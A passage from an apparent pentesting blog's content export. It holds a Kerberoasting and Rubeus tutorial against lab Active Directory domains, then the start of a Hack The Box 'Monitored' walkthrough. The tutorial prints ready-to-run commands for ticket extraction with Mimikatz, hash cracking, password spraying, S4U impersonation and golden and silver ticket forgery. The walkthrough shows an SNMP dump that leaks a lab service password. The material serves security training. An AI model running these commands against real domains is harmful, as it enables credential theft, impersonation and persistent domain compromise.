stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.\nKRB_TGS_REQ contains:\n\nEncrypted data with the session key\nUsername\nTimestamp\nTGT\nSPN of requested service e.g. SQL service\n\nStep 4: The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash (Locked with Red Key) &amp; Some Encrypted Message using User Hash.\nKRB_TGS_REP contains:\n\nUsername\nEncrypted data with the session key:\nService session key\nThe expiration date of TGS\nTGS, (Service Hash: RED Key) which contains:\nService session key\nUsername\nThe expiration date of TGS\nPAC with user privileges, signed by KDC\n\n\nStep 5: The user sends the copy of TGS to the Application Server,\nKRB_AP_REQ contains:\n\nTGS\nEncrypted data with the service session key:\nUsername\nTimestamp, to avoid replay attacks\n\nStep 6: The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.\nStep 7:  KDC verifies PAC (Optional)\nStep 8:  Allow the user to access the service for a specific time.\nSPNsThe Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.\nImportant Points\n\nIf you install multiple instances of a service on computers throughout a forest, each instance must have its SPN.\nBefore the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account.\nA given SPN can be registered on only one account.\nAn SPN must be unique in the forest in which it is registered.\nIf it is not unique, authentication will fail.\n\nSPNS syntaxThe SPN syntax has four elements\n\nType of SPN\nHost-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks\nSPNs that have been associated with a domain user account where NTLM hash will be used.\n\nLinux PerspectiveAttack Procedure.Depending on your positioning a network, Kerberos attacks can be performed in multiple ways.\n\nFrom a non-domain joined Linux host using valid domain user credentials.\nFrom a domain-joined Linux host as root after retrieving the keytab file.\nFrom a domain-joined Windows, the host is authenticated as a domain user.\nFrom a domain-joined Windows host with a shell in the context of a domain account.\nAs SYSTEM on a domain-joined Windows host.\nFrom a non-domain joined Windows host using runas &#x2F;netonly.\n\nTools.Some tools can be utilized to perform the attack.\n\nImpacket’s GetUserSPNs.py from a non-domain joined Linux host.\nA combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.\nFrom Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.\n\nREMEMBER!!!\nObtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.\nTGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.\nThe efficiency of AttackWhile it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.\nWe might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.\nN&#x2F;B - When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.\nREMEMBER!!!\nA prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.\nGetUserSPNs.pyListing SPN Accounts.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend\nRequesting all TGS tickets.**Later on, we can pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request\nRequesting a Single TGS Ticket.Wte can also be more targeted and request just the TGS ticket for a specific account. Let’s try requesting one for just the required account.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user\nWith this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.\nSaving the Ticket o facilitate offline cracking, it is always good to use the -outputfile flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs\nWindows PerspectiveKerberoasting - Semi-Manual Method.\nEnumerating SPNs with setspn.exesetspn.exe -Q */* running the command you’ll notice many different SPNs returned for the various hosts in the domain.\nRetrieving All Tickets using setspn.exesetspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;\nThe above command combines the previous command with setspn.exe to request tickets for all accounts with SPNs set.\nUsing Powershell we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using Mimkatz.\nTargeting a Single User**************PS C:\\htb&gt; Add-Type -AssemblyName System.IdentityModelPS C:\\htb&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;\nBefore moving on, let’s break down the commands above to see what we are doing (which is essentially what is used by Rubeus when using the default Kerberoasting method):\n\nThe Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object\nThe AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using\nSystem.IdentityModel is a namespace that contains different classes for building security token services\nWe’ll then use the New-Object cmdlet to create an instance of a .NET Framework object\nWe’ll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session\n\nWe can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.\nNow that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.\nExtracting Tickets from Memory with MimikatzUsing &#x27;mimikatz.log&#x27; for logfile : OKmimikatz # base64 /out:trueisBase64InterceptInput  is falseisBase64InterceptOutput is truemimikatz # kerberos::list /export&lt;SNIP&gt;[00000002] - 0x00000017 - rc4_hmac_nt   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM   Server Name: MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL   Client Name: htb-student @ INLANEFREIGHT.LOCAL   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;====================Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi====================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====================   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi\nIf we don’t specify the base64 &#x2F;out:true command, Mimikatz will extract the tickets and write the to .kirbi files. \n Next, you prepare the base blob for cracking echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\\\n then place the above into a file and convert it back to a .kirbi file using the base64 utility.cat encoded_file | base64 -d &gt; sqldev.kirbi\n Extract the kerberos ticket using kirbi2john.py this will create a file called crack_file, which then must be modified to be able to use Hashcat against the hash python2.7 kirbi2john.py sqldev.kirbi\nModifying the crack file for hashcat sed &#39;s/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/&#39; crack_file &gt; sqldev_tgs_hashcat now you can run the ticket through hashcat and get a clear password.\nSkipped VersionSo if we decide to skip the base64 output with mimkatz and type mimikatz # kerberos::list &#x2F;export, the .kirbi file will be written to disk, in this case, you can download the file and run kirbi2john.py against them directly, skipping the base64 decoding step.\nAUTOMATE VERSIONUsing PowerView to extract the TGS ticket and convert them to Hashcat format.\nExtracting TGS Ticket\nPS C:\\htb&gt; Import-Module .\\PowerView.ps1PS C:\\htb&gt; Get-DomainUser * -spn | select samaccountnamePS C:\\htb&gt; Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\nTarget Specific User\nGet-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\nExporting All Tickets to a CSV file and viewing the Content\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\ncat .\\ilfreight_tgs.csv\nREBEUShttps://github.com/GhostPack/Rubeus\nA tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos\nhttps://www.hackingarticles.in/a-detailed-guide-on-rubeus/\nTicket OperationsWorking in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.\nIn this section, we’ll talk about Rubeus and its capability to play around with tickets.\nAsktgtRubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let’s see an example where a clear-text password is supplied\nrubeus.exe asktgt /user:harshitrajpal /password: Password@1\n \nAs you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.\nrubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03\n\nAsktgs\nRubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.\nFor example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.\nrubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local\nBy providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.\n\nKlistKlist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.\n\nRenewThe renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the &#x2F;dc flag which will be used as a destination for the renewal traffic. We can further use the tgtdeleg option with this and extract user’s credentials without elevation and keep it alive on another system for a week by default.\n&#x2F;ptt flag can also be used in conjunction to apply the Kerberos\nrubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==\n\n&#x2F;autorenew sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket\nrubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==\n \nAs you may now observe that after a specified time interval a renewed TGT is shown\n\nBrute\nThe brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. &#x2F;noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,\nrubeus.exe brute /password:Password@1 /noticket\n\nHash\nRubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a hash function and provide a domain using &#x2F;domain, an account’s name (can be a machine account too) using the&#x2F;user flag and the password using &#x2F;password.\nrubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1\n\nAs you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.\nS4u\nWe saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link here. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the msDS-AllowedToActOnBehalfOfAnotherIdentity option set in the attribute’s editor. Follow the article here for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.\n\n&#x2F;rc4: flag is used to provide user noob’s account.\n\n&#x2F;impersonateuser: User that will be impersonated by noob.\n\n&#x2F;msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller\n\n&#x2F;altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.\n\n&#x2F;ptt: Injects the resulting ticket in the current terminal session\n\n\nrubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt\n\nThis would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.\n\nGolden TicketGolden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article here.\nTo forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,\n\n&#x2F;ldap: Retrieves information of user over LDAP protocol\n\n&#x2F;user: Username whose ticket will be forged\n\n&#x2F;printcmd: displays a one liner command that can be used to generate the ticket again that just got generated\n\n\nrubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1\nrubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd\n\nAs you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal\n\nAlso, at the end you’ll see a one liner command that can be used to generate this TGT again.\n\nVarious other options can be used in conjunction with golden to modify the generated TGT like:\n\n&#x2F;rangeinterval: After every time specified, a new ticket will be generated.\n\n&#x2F;rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.\n\n\nFor a full list of modifications, see this page.\n\nSilver TicketSilver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page here.\nSilver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:\n\n&#x2F;service: SPN of the service ticket is being generated for\n\n&#x2F;rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket\n\n&#x2F;user: username of the user whose hash is provided\n\n&#x2F;creduser: User to be impersonated\n\n&#x2F;credpassword: Password of the user to be impersonated\n\n&#x2F;krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.\n\n&#x2F;krbenctype: type of encrypted hash used. Aes256 here.\n\n\nrubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1\nrubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt\n\nThis helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive\ndir \\\\dc1.ignite.local\\c$\nTicket ManagementRubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.\nPtt\nThe Rubeus ptt option can import the supplied ticket in command line. The &#x2F;ptt can also be used in conjunction with other options that output tickets. For example,\nrubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==\n\nAs you can see, the generated ticket has now been imported.\nPurge\nRubeus has a purge option which can purge&#x2F;delete all the tickets existing in the current session.\nHere, we demonstrate how we purged 2 tickets listed by klist.\nrubeus.exe purge\n\nDescribe\nOften we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.\nWe can provide the ticket using &#x2F;ticket flag.\nrubeus.exe describe /ticket:doIFNDCCBTCg...bA==\n\nTriage\nWhile klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user’s session memory but other user’s tickets in memory too.\n\n&#x2F;luid: This flag can be used to provide a specific user ID.\n\nrubeus.exe triagerubeus.exe triage /luid:*0x8f57c*\n\nAlso, when the LUID is known, we can purge particular user’s tickets too (elevated mode only)\nrubeus.exe purge /luid:*0x8f57c*\n\nDump\nIf the session is running in an elevated mode, a user can dump&#x2F; extract all the current TGTs and service tickets. Again, &#x2F;luid can be provided to dump specific user’s tickets. &#x2F;service can be used to filter these tickets.\nFor example, &#x2F;service:krbtgt displays only TGTs.\nrubeus.exe dump\n\nNext part I’ll work on the mitigation bit as it’s own unit hope you learnt a few bit on the read … 😊   \n","categories":["Writeups"],"tags":["Active-Directory"]},{"title":"Monitored","url":"/2024/02/29/manager/","content":"\nToday we’ll be covering an interesting box called Monitored introduced with a medium level difficulty so let’s check it out.\nNmap Scans.Starting off with some port enumeration we get some interesting ports open.\nPORT     STATE  SERVICE          VERSION22/tcp   open   ssh              OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)53/tcp   closed domain80/tcp   open   http             Apache httpd 2.4.56135/tcp  closed msrpc389/tcp  open   ldap139/tcp  closed netbios-ssn445/tcp  closed microsoft-ds464/tcp  closed kpasswd5593/tcp  closed http-rpc-epmap636/tcp  closed ldapssl1433/tcp closed ms-sql-s3268/tcp closed globalcatLDAP3269/tcp closed globalcatLDAPssl5667/tcp open   tcpwrappedService Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\nWeb Enumeration (port 80)Intially checking port 80 it redirects to nagios.monitored.htb checking the site out. We are redirected to nagios XI. which is a server and networking monitoring software.\nFuzzing port 80.Trying login with the default credentials found online didn’t provide us with access, hence the next step was to fuzz for some directory that might be hidden.\n.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 305ms]                        [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 306ms].php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms].hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 257ms].htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 243ms].htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 231ms].htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 238ms].htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 247ms]cgi-bin/.php            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]cgi-bin/                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 208ms]index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 254ms]javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 215ms]nagios                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 227ms]server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 239ms]\nWe see that the nagios directory seems interesting but navigating tot the directory doesn’t produce anything fruitful, but looking at the link on the site we identify a certian keyword which seems like a directory nagiosxi.\nnagiosxiFuzzing the directory we get some interesting directories, \n# directory-list-2.3-small.txt [Status: 200, Size: 26737, Words: 5495, Lines: 468, Duration: 486ms]help                    [Status: 200, Size: 26749, Words: 5495, Lines: 468, Duration: 267ms]tools                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 298ms]mobile                  [Status: 200, Size: 15978, Words: 2562, Lines: 225, Duration: 296ms]admin                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 279ms]reports                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 296ms]account                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 294ms]includes                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 333ms]backend                 [Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 306ms]db                      [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 251ms]api                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 210ms]config                  [Status: 200, Size: 26753, Words: 5495, Lines: 468, Duration: 291ms]views                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 280ms]sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 259ms]terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 275ms]\nChecking out terminal directory, there’s a shell in box gui which after trying out soem authentication bypasses it didn’t work.Later on went on to fuzz the api endpoint. \nAPIFuzzing the API endpoints gives us 2 endpoints the v1 and includes. v1 when fuzzing api endpoints is an indicator of version controlled endpoints. checking out the v1 endpoint we get a lot of results.\nNote:If we visit &#x2F;api&#x2F;v1&#x2F;xxx we can see that all the “endpoints” were giving us same message with size of 32 so we gave -fs 32 option to filter out mostly false-positive hits.&#96;\nlicense                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 1163ms]%20                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 350ms]video games             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 288ms]authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 2336ms]\n\nWe get an interesting endpoint called authenticate but trying to access it we find that, we can only use POST to authenticate and since we don’t have any credentials to authenticate with decided to go back to the nmap results and enumerate more.\nUDPPORT      STATE         SERVICE7/udp     open|filtered echo53/udp    open|filtered domain68/udp    open|filtered dhcpc123/udp   open          ntp161/udp   open          snmp162/udp   open|filtered snmptrap16838/udp open|filtered unknown18617/udp open|filtered unknown21131/udp open|filtered unknown21698/udp open|filtered unknown28547/udp open|filtered unknown49181/udp open|filtered unknown\n\nEnumerating UDP ports, we find that snmp is open, enumerating snmp using braa a mass snmp scanner. We get interesting results.\niso.3.6.1.2.1.25.4.2.1.5.505 = STRING: &quot;--config /etc/laurel/config.toml&quot;iso.3.6.1.2.1.25.4.2.1.5.549 = STRING: &quot;-f&quot;iso.3.6.1.2.1.25.4.2.1.5.550 = STRING: &quot;--system --address=systemd: --no fork --nopidfile --systemd-activation --syslog-only&quot;iso.3.6.1.2.1.25.4.2.1.5.553 = STRING: &quot;-n -iNONE&quot;iso.3.6.1.2.1.25.4.2.1.5.556 = STRING: &quot;-u -s -O /run/wpa_supplicant&quot;iso.3.6.1.2.1.25.4.2.1.5.568 = STRING: &quot;-f&quot;iso.3.6.1.2.1.25.4.2.1.5.583 = STRING: &quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &quot;iso.3.6.1.2.1.25.4.2.1.5.642 = STRING: &quot;-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0&quot;iso.3.6.1.2.1.25.4.2.1.5.762 = STRING: &quot;-f /usr/local/nagios/etc/pnp/npcd.cfg&quot;iso.3.6.1.2.1.25.4.2.1.5.769 = STRING: &quot;-LOw -f -p /run/snmptrapd.pid&quot;iso.3.6.1.2.1.25.4.2.1.5.783 = STRING: &quot;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid&quot;iso.3.6.1.2.1.25.4.2.1.5.804 = STRING: &quot;-p /var/run/ntpd.pid -g -u 108:116&quot;iso.3.6.1.2.1.25.4.2.1.5.806 = STRING: &quot;-o -p -- \\\\u --noclear tty1 linux&quot;iso.3.6.1.2.1.25.4.2.1.5.841 = STRING: &quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;iso.3.6.1.2.1.25.4.2.1.5.843 = STRING: &quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;iso.3.6.1.2.1.25.4.2.1.5.848 = STRING: &quot;-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d&quot;iso.3.6.1.2.1.25.4.2.1.5.860 = STRING: &quot;-k start&quot;iso.3.6.1.2.1.25.4.2.1.5.870 = STRING: &quot;-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf&quot;iso.3.6.1.2.1.25.4.2.1.5.942 = STRING: &quot;/usr/sbin/snmptt --daemon&quot;iso.3.6.1.2.1.25.4.2.1.5.943 = STRING: &quot;/usr/sbin/snmptt --daemon&quot;iso.3.6.1.2.1.25.4.2.1.5.972 = STRING: &quot;-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6&quot;iso.3.6.1.2.1.25.4.2.1.5.976 = STRING: &quot;-d /usr/local/nagios/etc/nagios.cfg&quot;iso.3.6.1.2.1.25.4.2.1.5.977 = STRING: &quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;iso.3.6.1.2.1.25.4.2.1.5.978 = STRING: &quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;iso.3.6.1.2.1.25.4.2.1.5.979 = STRING: &quot;--worker /usr/local/nagios/var/rw/nagios.qh&quot;\n\nwe identify there’s a user called svc and also a passowrd that the user tried to authenticate with.\niso.3.6.1.2.1.25.4.2.1.5.583 = STRING: &quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &quot;\n\nInitial Foothold.Now having creds to login and hving prior knowledge that we have a few instances on the API and terminal endpoints that we had to try out, started out with the terminal endpoint, didn’t give us any results, proceeded to the API endpoint where we are need to construct a post request so as to authenticate.\n\nAn Auth Token Obtain after using curl.\ncurl -X POST -k -L -d 